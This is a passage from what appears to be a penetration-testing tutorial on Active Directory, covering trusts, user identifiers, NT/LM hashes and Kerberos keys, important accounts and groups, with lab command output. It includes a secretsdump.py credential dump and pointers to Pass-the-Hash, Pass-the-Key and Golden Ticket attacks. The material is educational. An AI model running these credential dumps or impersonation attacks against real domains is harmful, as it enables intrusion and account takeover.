Here we can see that our current domain is <code class="verbatim">poke.mon</code> (cause of the
<code>(Primary Domain)</code> attribute) and there are a couple of trusts. The outbound
trust with <code class="verbatim">contoso.local</code> indicates that its users can access to our domain,
<code class="verbatim">poke.mon</code>. Moreover, there is a second bidirectional trust with <code class="verbatim">it.poke.mon</code>
that is a subdomain of <code class="verbatim">poke.mon</code> and it is in the same forest.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; nltest /domain_trusts
</span></span><span style="display:flex;"><span>List of domain trusts<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span> POKEMON poke.mon (NT <span style="color:#ae81ff">5</span>) (Direct Inbound) ( Attr<span style="color:#960050;background-color:#1e0010">:</span> foresttrans )
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span> CONTOSO contoso.local (NT <span style="color:#ae81ff">5</span>) (Forest Tree Root) (Primary Domain) (Native)
</span></span><span style="display:flex;"><span>The command completed successfully</span></span></code></pre></div>
</div>
<figcaption>
Trusts of contoso.local
</figcaption>
</figure>
<p>
Consequently, if we check the trust of <code class="verbatim">contoso.local</code>, we can see an inbound
connection from <code class="verbatim">poke.mon</code>, which is consistent with the previous information.
So users of <code class="verbatim">contoso.local</code> can access to <code class="verbatim">poke.mon</code>.</p>
</div>
</div>
<div id="outline-container-trust transitivity" class="outline-3">
<h3 id="trust transitivity">
Trust transitivity
</h3>
<div id="outline-text-trust transitivity" class="outline-text-3">
<p>
Moreover, a <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc754612(v=ws.10)">trust can be transitive or nontransitive</a>. A nontransitive trust can
only be used by the two sides of the trust, the trusting and the
trusted. Whereas a transitive trust can act as a bridge and being used for third
domains connected with the domains that are connected by the transitive trust.</p>
<figure>
<pre class="example">      (trusting)   trusts   (trusted)  (trusting)   trusts   (trusted)
  Domain A  -------------------&gt;  Domain B --------------------&gt; Domain C
                    access                          access
            &lt;-------------------           &lt;--------------------
</pre>
<figcaption>
Three domains connected by trusts
</figcaption>
</figure>
<p>
For example, if the trust between <code class="verbatim">Domain A</code> and <code class="verbatim">Domain B</code> is transitive, then
the users of <code class="verbatim">Domain C</code> can access to <code class="verbatim">Domain A</code> by traversing both trusts. If
the <code class="verbatim">Domain A --&gt; Domain B</code> trust was nontransitive, the <code class="verbatim">Domain C</code> users couldn't
access to <code class="verbatim">Domain A</code>, but <code class="verbatim">Domain B</code> users could.</p>
<p>
Therefore, in relation with the domains in the same forest , all the domains
users can access to other domains cause all the parent and child domains are
connected through bidirectional transitive trusts. This way, any domain of the
forest can traverse the required trusts to access to other domain in the same
forests.</p>
<p>
In a forest, to allow access from any domain to any other, all the parents and
children are connected by a bidirectional transitive trust.</p>
<figure>
<pre class="example">              contoso.local
               ^  v   v  ^  
          .----'  |   |  '----.
          |  .----'   '----.  |
          ^  v             v  ^
     it.contoso.local hr.contoso.local
          ^  v 
          |  |
          ^  v
  webs.it.contoso.local
</pre>
<figcaption>
contoso.local forest trusts
</figcaption>
</figure>
<p>
So to access to computers of <code class="verbatim">hr.contoso.local</code>, a user of
<code class="verbatim">webs.it.contoso.local</code> must traverse three trusts.</p>
</div>
</div>
<div id="outline-container-trust-types" class="outline-3">
<h3 id="trust-types">
Trust types
</h3>
<div id="outline-text-trust-types" class="outline-text-3">
<p>
In Active Directory there are several <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc730798(v=ws.10)#trust-types">trust types</a> for different purposes:</p>
<ul>
<li><strong>Parent-Child</strong>: The default trusts created between a parent domain and its
child.</li>
<li><strong>Forest</strong>: A trust to share resources between forests. This way any domain of the
forest can access to any domain on the other forest (if the direction and
transitivity of the trust allow it). If a forest trust is misconfigured, then
it can allow to <a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">take control of the other forest</a>.</li>
<li><strong>External</strong>: A trust to connect to a specific domain that is in a non trusted
forest.</li>
<li><strong>Realm</strong>: A special trust to connect Active Directory and a non-Windows domain.</li>
<li><strong>Shortcut</strong>: When two domains within the forest communicate often but are not
directly connected, you can avoid jumping over many trusts by creating a
direct shortcut trust.</li>
</ul>
</div>
</div>
<div id="outline-container-trust-key" class="outline-3">
<h3 id="trust-key">
Trust key
</h3>
<div id="outline-text-trust-key" class="outline-text-3">
<p>
Technically, when you use a trust, there is a communication between the domain
controller of your domain and the domain controller of the target domain (or of
an intermediary domain).</p>
<p>
How communication is made varies depending of the protocol that is being used
(which could be NTLM, Kerberos, etc), but in any case, the domain controllers
needs to share a key to keep the communications secure. This key is known as the
trust key and it's created when the trust is established.</p>
<p>
When a trust is created, a <a href="#trust-accounts">trust account</a> is created in the domain database as if it
were an user (with the name finished in <code class="verbatim">$</code>). The trust key is then stored as if
it was the password of the trust user (in the <a href="#lm-nt-hash">NT hash</a> and <a href="#user-kerberos-keys">Kerberos keys</a>).</p>
</div>
</div>
<div id="outline-container-more-on-trusts" class="outline-3">
<h3 id="more-on-trusts">
More on trusts
</h3>
<div id="outline-text-more-on-trusts" class="outline-text-3">
<p>
To know how trusts can be abused in a pentest, you can check the following
posts (a little knowledge in Kerberos is also recommended to read them):</p>
<ul>
<li><a href="https://adsecurity.org/?p=1588">It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts</a></li>
<li><a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li>
<li><a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">Active Directory forest trusts part 1 - How does SID filtering work?</a></li>
<li><a href="https://blog.xpnsec.com/inter-realm-key-roasting/">Inter-Realm Key Roasting (well… within the first 30 days)</a></li>
<li><a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-users" class="outline-2">
<h2 id="users">
Users
</h2>
<div id="outline-text-users" class="outline-text-2">
<p>
One of the key points for using Active Directory is the users management. Every
organization manages its users in different ways, setting for them name formats,
assigning different permissions, etc.</p>
<p>
To easily manage the users in Active Directory, their are stored as a objects in
the central <a href="#database">database</a> that can be consulted and manipulated from any point of the
domain (if you have enough rights).</p>
<div id="outline-container-user-properties" class="outline-3">
<h3 id="user-properties">
User properties
</h3>
<div id="outline-text-user-properties" class="outline-text-3">
<div id="outline-container-user-identifiers" class="outline-4">
<h4 id="user-identifiers">
User Identifiers
</h4>
<div id="outline-text-user-identifiers" class="outline-text-4">
<p>
The user object stores many different data, but the first attributes to be taken
into account are those that allows us to identify an user.</p>
<p>
For identifying an user usually the username is used, that is stored in the
<strong>SamAccountName</strong> attribute. Additionally, the <strong>SID</strong> (Security Identifier) can also
be used to identifying the user.</p>
<p>
The user SID is similar to the domain SID, and, in fact is the combination of
the domain SID plus the user RID (Relative Identifier), which is the last number
that appears in the user SID.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; Get-ADUser Anakin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=Anakin,CN=Users,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>Enabled           <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>GivenName         <span style="color:#960050;background-color:#1e0010">:</span> Anakin
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> Anakin
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> user
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> 58ab0512-9c96-<span style="color:#ae81ff">4e97</span>-bf53-019e86fd3ed7
</span></span><span style="display:flex;"><span>SamAccountName    <span style="color:#960050;background-color:#1e0010">:</span> anakin
</span></span><span style="display:flex;"><span>SID               <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span>-<span style="color:#ae81ff">1103</span>
</span></span><span style="display:flex;"><span>Surname           <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>UserPrincipalName <span style="color:#960050;background-color:#1e0010">:</span> anakin@contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Get user information
</figcaption>
</figure>
<p>
In this case the domain SID is <code class="verbatim">S-1-5-21-1372086773-2238746523-2939299801</code> and
the user RID is <code class="verbatim">1103</code>. Some tools display the SID in their output instead of
the username (since its used in some structures like <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-security_descriptor">security descriptors</a>), so
you should be aware of its format in order to identify it.</p>
<p>
Also, the <code class="verbatim">DistinguishedName</code> is used by the
<a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names">LDAP API to identify the objects</a>, so if you query the database by using LDAP
(which is one of the most common ways) you will probably see references to
objects through its <code class="verbatim">DistinguishedName</code>.</p>
</div>
</div>
<div id="outline-container-user-secrets" class="outline-4">
<h4 id="user-secrets">
User Secrets
</h4>
<div id="outline-text-user-secrets" class="outline-text-4">
<p>
Moreover, the database also needs to store the user secrets in order to allow
the Domain Controller to authenticate the user. The user password is not stored
in plaintext, but the following secrets derived from it are saved:</p>
<ul>
<li>NT hash (and LM hash for the older accounts)</li>
<li>Kerberos keys</li>
</ul>
<p>Needless to say, that user secrets cannot be retrieved by non admin users.
Not even the domain computers can access to them, but leave the authentication to
the Domain Controller.</p>
<p>
In order to get the user secrets, you need administrator privileges (or
equivalent) to <a href="#domain-database-dumping">dump the domain database</a> with a dcsync attack or grabbing the
<code class="verbatim">C:\Windows\NTDS\ntds.dit</code> file from the Domain Controller.</p>
<div id="outline-container-lm-nt-hashes" class="outline-5">
<h5 id="lm-nt-hashes">
LM/NT hashes
</h5>
<div id="outline-text-lm-nt-hashes" class="outline-text-5">
<p>
The <a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4">LM and NT hashes</a> are stored both in Windows local <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM</a> and Active Directory
NTDS databases to authenticate the local and domain users, respectively. These
hashes, both LM and NT are 16 bytes long.</p>
<figure>
<pre class="example">Password: 123456
LM hash: 44EFCE164AB921CAAAD3B435B51404EE
NT hash: 32ED87BDB5FDC5E9CBA88547376818D4
</pre>
<figcaption>
LM and NT hashes of a password
</figcaption>
</figure>
<p>
However, <a href="https://en.wikipedia.org/wiki/LAN_Manager#Security_weaknesses">LM hashes are pretty weak</a> so they are not used since Windows
Vista/Server 2008. The <a href="https://asecuritysite.com/encryption/lmhash">procedure to create an LM hash</a> is the following:</p>
<ol>
<li>Convert the user password into uppercase. (This reduces the search space for
a bruteforce attack).</li>
<li>If the user password is less than 14 characters is padded with NULL
characters until the length is 14. If the password is more than 14
characters, then is truncated. (Is useless to have passwords of more than 14
characters).</li>
<li>The password is then split in two strings of 7 bytes each one.</li>
<li>Each 7-bytes string is used as key to encrypt the <code class="verbatim">KGS!+#$%</code> string using the
DES cryptographic algorithm. This result in two hashes.</li>
<li>The resultant two values are concatenated in order to form the LM hash. (You
can crack each part separately)</li>
</ol>
<figure>
<pre class="example">upper_password = to_uppercase(password)
14_password = truncate_to_14_bytes(upper_password)

7_part1, 7_part2 = split_7(14_password)

hash1 = des(7_part1, "KGS!+#$%")
hash2 = des(7_part2, "KGS!+#$%")

lm_hash = hash1 + hash2
</pre>
<figcaption>
LM hash calculation pseudocode
</figcaption>
</figure>
<p>
On the other hand, the NT hash is a little stronger, but a <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a> is not used to
calculate it, so it can be cracked by using precomputed values
(like <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow tables</a>).</p>
<p>
If you are curious, the NT hash is calculated by applying the <a href="https://en.wikipedia.org/wiki/MD4">MD4</a> algorithm
(that <a href="https://tools.ietf.org/html/rfc6150">is obsolete</a>) directly to the Unicode version (specifically the UTF-16LE
encoding) of the user password.</p>
<figure>
<pre class="example">nt_hash = md4(encode_in_utf_16le(password))
</pre>
<figcaption>
NT hash calculation pseudocode
</figcaption>
</figure>
<blockquote>
<p>Many times the NT hash is called NTLM hash, however this can be confusing
since the NTLM protocol also use hashes, called NTLM hashes. In this article an
NTLM hash will be a hash of the NTLM protocol.</p>
</blockquote>
<p>
Many tools allow you to extract the LM and NT hashes, and they usually return an
output with several lines, one per user, with the format
<code class="verbatim">&lt;username&gt;:&lt;rid&gt;:&lt;LM&gt;:&lt;NT&gt;:::</code>. In case of LM is not being used, its value will
be <code class="verbatim">aad3b435b51404eeaad3b435b51404ee</code> (the LM hash of an empty string).</p>
<figure>
<pre class="example">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6:::
user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
</pre>
<figcaption>
Hashes dump format
</figcaption>
</figure>
<p>
It is important for a pentester to recognize NT hashes since, even they are not
the user passwords, are used for authenticate in Windows machines, so they are
very useful. They can be used to perform <a href="#pass-the-hash">Pass-The-Hash</a> or <a href="#pass-the-key">Overpass-the-Hash</a>
attacks in order to impersonate users in remote machines.</p>
<p>
Additionally, you can try to crack the LM and NT hashes with <a href="https://hashcat.net/">hashcat</a> to recover
the original password. If you are lucky and the LM hash is present, this should
be quickly.</p>
</div>
</div>
<div id="outline-container-user-kerberos-keys" class="outline-5">
<h5 id="user-kerberos-keys">
Kerberos keys
</h5>
<div id="outline-text-user-kerberos-keys" class="outline-text-5">
<p>
Apart from the LM/NT hashes, the <strong>Kerberos keys</strong>, derived from the user
password and used in the Kerberos authentication protocol, are stored.</p>
<p>
The Kerberos keys can be used to ask for a Kerberos ticket that represents the
user in Kerberos authentication. There are several different keys, and different
ones are used for different Kerberos encryption support:</p>
<ul>
<li>AES 256 key: Used by the <a href="https://tools.ietf.org/html/rfc3962">AES256-CTS-HMAC-SHA1-96</a> algorithm. This is the one
commonly used by Kerberos, and the one a pentester should use in order to
avoid triggering alarms.</li>
<li>AES 128 key: Used by the <a href="https://tools.ietf.org/html/rfc3962">AES128-CTS-HMAC-SHA1-96</a> algorithm.</li>
<li>DES key: Used by the <a href="https://datatracker.ietf.org/doc/html/rfc6649">deprecated</a> <a href="https://datatracker.ietf.org/doc/html/rfc3961#section-6.2.1">DES-CBC-MD5</a> algorithm.</li>
<li>RC4 key: This is the <a href="#lm-nt-hashes">NT hash</a> of the user used by the <a href="https://tools.ietf.org/html/rfc4757">RC4-HMAC</a> algorithm.</li>
</ul>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ secretsdump.py <span style="color:#e6db74">'contoso.local/Administrator@192.168.100.2'</span> -just-dc-user anakin
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span style="display:flex;"><span>contoso.local<span style="color:#ae81ff">\a</span>nakin:1103:aad3b435b51404eeaad3b435b51404ee:cdeae556dc28c24b5b7b14e9df5b6e21:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
</span></span><span style="display:flex;"><span>contoso.local<span style="color:#ae81ff">\a</span>nakin:aes256-cts-hmac-sha1-96:ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e
</span></span><span style="display:flex;"><span>contoso.local<span style="color:#ae81ff">\a</span>nakin:aes128-cts-hmac-sha1-96:18fe293e673950214c67e9f9fe753198
</span></span><span style="display:flex;"><span>contoso.local<span style="color:#ae81ff">\a</span>nakin:des-cbc-md5:fbba85fbb63d04cb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...</span></span></code></pre></div>
</div>
<figcaption>
Kerberos keys extracted from the domain database
</figcaption>
</figure>
<p>
These keys can be used in a <a href="#pass-the-key">Pass-The-Key</a> attack to retrieve a ticket for the
impersonated user. Then you can use that Kerberos ticket to authenticate against
different services of the domain on behalf of the user.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-useraccountcontrol" class="outline-4">
<h4 id="useraccountcontrol">
UserAccountControl
</h4>
<div id="outline-text-useraccountcontrol" class="outline-text-4">
<p>
One interesting property of the user class is the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> (UAC) (do
not confuse it with the User Account Control mechanism to avoid executing
elevated programs in Windows machines).</p>
<p>
The UserAccountControl property contains a <strong>series of flags</strong> that are very
relevant for the security and the domain and used in many attacks mentioned in
this post. Here are the most relevant:</p>
<ul>
<li><strong>ACCOUNTDISABLE</strong> -&gt; Account is disabled and cannot be used.</li>
<li><strong>DONT_REQUIRE_PREAUTH</strong> -&gt; The account doesn't require Kerberos
pre-authentication.</li>
<li><strong>NOT_DELEGATED</strong> -&gt; This account cannot be delegated through Kerberos
delegation.</li>
<li><strong>TRUSTED_FOR_DELEGATION</strong> -&gt; Kerberos Unconstrained Delegation is enabled for
this account and its services. <a href="http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">SeEnableDelegationPrivilege</a> required to modify
it.</li>
<li><strong>TRUSTED_TO_AUTH_FOR_DELEGATION</strong> -&gt; The Kerberos S4U2Self extension is enabled
for this account and its services. <a href="http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">SeEnableDelegationPrivilege</a> required to modify
it.</li>
</ul>
</div>
</div>
<div id="outline-container-other-user-properties" class="outline-4">
<h4 id="other-user-properties">
Other user properties
</h4>
<div id="outline-text-other-user-properties" class="outline-text-4">
<p>
There are other properties that can be useful in a pentest:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-description">Description</a> -&gt; A description of the user. It can give an idea of the
permissions of the user, and sometimes even includes the password.</li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-admincount">AdminCount</a> -&gt; Indicates if the user (or group) is protected by the
<a href="https://adsecurity.org/?p=1906">AdminSDHolder</a> object, or it has been. Since sometimes is not updated, use
it only as a reference.</li>
<li><strong>MemberOf</strong> -&gt; Groups of which the user is a member. This property is logical
and is generated from the groups <strong>Members</strong> property.</li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-primarygroupid">PrimaryGroupID</a> -&gt; The primary group of the user. This group doesn't appear in
<strong>MemberOf</strong> property.</li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname">ServicePrincipalName</a> -&gt; Services of the user. Can be useful for the Kerberoast
attack.</li>
<li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa">msDS-AllowedToDelegateTo</a> -&gt; The list of services for which the user (and its
own services) can impersonate clients using Kerberos Constrained Delegation.
<a href="http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">SeEnableDelegationPrivilege</a> required to modify it. </li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-important-users" class="outline-3">
<h3 id="important-users">
Important Users
</h3>
<div id="outline-text-important-users" class="outline-text-3">
<p>
To consult the users there are several options, like the <code class="verbatim">net user /domain</code>
command, or Powershell. There is no need to have an special privilege to list
users, any user can do it.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; Get-ADUser -Filter * | select SamAccountName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SamAccountName
</span></span><span style="display:flex;"><span>--------------
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>Guest
</span></span><span style="display:flex;"><span>krbtgt
</span></span><span style="display:flex;"><span>anakin
</span></span><span style="display:flex;"><span>han
</span></span><span style="display:flex;"><span>POKEMON$</span></span></code></pre></div>
</div>
<figcaption>
List users with Powershell
</figcaption>
</figure>
<p>
As you may notice, my test domain is little with very few users, but in a real
engagement there will be hundreds or thousands of users. So it should be
important to distinguish what are the really important. This could be a little
tricky since it depends on the organization, but usually members of the IT team
use to have privileged users, they need it to do their work.</p>
<p>
Moreover, by default the <strong>built-in <code class="verbatim">Administrator</code> user is the most privileged
account of the domain</strong>. It can perform any action in any computer. So if you are
able to compromise this account, you can have total control of the domain (and
even the forest by using <a href="https://adsecurity.org/?p=1640">the SID history attack</a>).</p>
<p>
Additionally, the <code class="verbatim">krbtgt</code> account is very important too. Its secrets (NT hash
and Kerberos keys) are used to encrypt the tickets (specifically the TGTs) used
by Kerberos that allows to authenticate users. If you are able to compromise
the <code class="verbatim">krbtgt</code> account, you will be able of create <a href="https://en.hackndo.com/kerberos-silver-golden-tickets/">Golden Tickets</a>. Usually, this
account can only be compromised by dumping the domain database, since its only
used in the Domain Controllers, which will require that you have administrator
privileges in the domain.</p>
</div>
</div>
<div id="outline-container-computer-accounts" class="outline-3">
<h3 id="computer-accounts">
Computer accounts
</h3>
<div id="outline-text-computer-accounts" class="outline-text-3">
<p>
Another thing to take into account is that in a organization, each person has
its own user, and even certain people like the IT department could have more
than user per person to perform different tasks. Moreover, also <strong>each computer of
the domain has its own user</strong>, since they also need to perform their own actions
in the domain, like for instance, update the Group Policies, verify the
credentials of domain users logged in the computer, etc.</p>
<p>
The difference between user accounts and computers accounts is that the firsts
are stored as instances of <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-user">User class</a> in the database whereas the others are
stored as instances of <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-computer">Computer class</a> (which is a subclass of User class).
Moreover the computer accounts names are the computer hostname finished with a
dollar sign <code class="verbatim">$</code>.</p>
<p>
You can check it by executing the following command:</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">"objectClass=User"</span> -Properties SamAccountName | select SamAccountName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SamAccountName
</span></span><span style="display:flex;"><span>--------------
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>Guest
</span></span><span style="display:flex;"><span>DC01$
</span></span><span style="display:flex;"><span>krbtgt
</span></span><span style="display:flex;"><span>anakin
</span></span><span style="display:flex;"><span>WS01-<span style="color:#ae81ff">10</span>$
</span></span><span style="display:flex;"><span>WS02-<span style="color:#ae81ff">7</span>$
</span></span><span style="display:flex;"><span>DC02$
</span></span><span style="display:flex;"><span>han
</span></span><span style="display:flex;"><span>POKEMON$</span></span></code></pre></div>
</div>
<figcaption>
Retrieve all users of the domain
</figcaption>
</figure>
<p>
As you can see, there are many more users than using the <code>Get-ADUser</code> command,
since subclasses of User class are now included. You can appreciate that new
accounts finish with a dollar sign and seems to have a computer name. For
example, <code class="verbatim">DC01$</code> and <code class="verbatim">DC02$</code> for the Domain Controllers and <code class="verbatim">WS01-10$</code> and
<code class="verbatim">WS02-7$</code> for the workstations.</p>
<p>
Moreover, the computer objects also saved information about their operating
system, that can be retrieved from the attributes <code class="verbatim">OperatingSystem</code> or
<code class="verbatim">OperatingSystemVersion</code>.</p>
<p>
Also, many organizations have rules to choose the name of the computers as well
as the users, so if you are able to make sense of the names, you may be aware of
the use of the computer and user accounts and which of the can be privileged or
contain access to sensible information. Additionally you can check another
attributes of the objects like <code class="verbatim">Description</code> in order to find more information
there (and even cleartext passwords). The <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">Find-DomainObjectPropertyOutlier</a>
Cmdlet of <a href="https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1">Powerview</a> can be useful for that purpose.</p>
</div>
</div>
<div id="outline-container-trust-accounts" class="outline-3">
<h3 id="trust-accounts">
Trust accounts
</h3>
<div id="outline-text-trust-accounts" class="outline-text-3">
<p>
However there is also the <code class="verbatim">POKEMON$</code> account that appears in both <code>Get-ADUser</code>
and <code>Get-ADObject</code>, but whose name is finished by a dollar sign. That could be
normal user (there is no problem with creating usernames finished with <code class="verbatim">$</code>),
however, as we have seen previously, there is a trust with the <code class="verbatim">poke.mon</code>
domain.</p>
<p>
When an trust is established, an associated user object is created in each
domain to store the trust key. The name of the user is the NetBIOS name of the
other domain, finished in $ (similar to a computer account name). For example,
in case of the trust between the domains FOO and BAR, the FOO domain would
store the trust key in the BAR$ user, and the BAR domain would store it in
the FOO$ user.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADUser  -LDAPFilter <span style="color:#e6db74">"(SamAccountName=*$)"</span> | select SamAccountName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SamAccountName
</span></span><span style="display:flex;"><span>--------------
</span></span><span style="display:flex;"><span>POKEMON$</span></span></code></pre></div>
</div>
<figcaption>
List trust accounts in domain
</figcaption>
</figure>
<p>
This <code class="verbatim">POKEMON$</code> user object is used to store the trust keys, which are the
NT hash or Kerberos keys (one of other is used depending on the context). If you
can <a href="Domain database dumping">get the secrets</a> of this account, you can create
<a href="https://adsecurity.org/?p=1588">inter-realm Kerberos tickets</a>. </p>
</div>
</div>
</div>
</div>
<div id="outline-container-groups" class="outline-2">
<h2 id="groups">
Groups
</h2>
<div id="outline-text-groups" class="outline-text-2">
<p>
But the management of users can be cumbersome without groups. Imagine that you
have the managers department that needs to access to highly sensitive documents.
Should you give permission to each manager one by one? A lot of work, but you
can handle it because only a new manager is added each year. But now the policy
changes and managers should also be able to access to documents of human resources
department. Should you change all the permissions of the managers one by one?
No, that is too much work, and is pretty bored.</p>
<p>
The solution is to use <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#default-security-groups">groups</a>. In this case you could have a "Manager" group
where the manager users are added, and when the policy changes you have to add
or remove permissions for the group.</p>
<p>
As well as users, the groups are stored in the domain database. And, in the same
way, they can be identified by the <code class="verbatim">SamAccountName</code> attribute or the SID.</p>
<p>
You can consult the database in order to list the groups and their members.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; Get-ADGroup -Filter * | select SamAccountName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SamAccountName
</span></span><span style="display:flex;"><span>--------------
</span></span><span style="display:flex;"><span>Administrators
</span></span><span style="display:flex;"><span>Users
</span></span><span style="display:flex;"><span>Guests
</span></span><span style="display:flex;"><span>&lt;-- stripped output --&gt;
</span></span><span style="display:flex;"><span>Domain Computers
</span></span><span style="display:flex;"><span>Domain Controllers
</span></span><span style="display:flex;"><span>Schema Admins
</span></span><span style="display:flex;"><span>Enterprise Admins
</span></span><span style="display:flex;"><span>Cert Publishers
</span></span><span style="display:flex;"><span>Domain Admins
</span></span><span style="display:flex;"><span>Domain Users
</span></span><span style="display:flex;"><span>&lt;-- stripped output --&gt;
</span></span><span style="display:flex;"><span>Protected Users
</span></span><span style="display:flex;"><span>Key Admins
</span></span><span style="display:flex;"><span>Enterprise Key Admins
</span></span><span style="display:flex;"><span>DnsAdmins
</span></span><span style="display:flex;"><span>DnsUpdateProxy
</span></span><span style="display:flex;"><span>DHCP Users
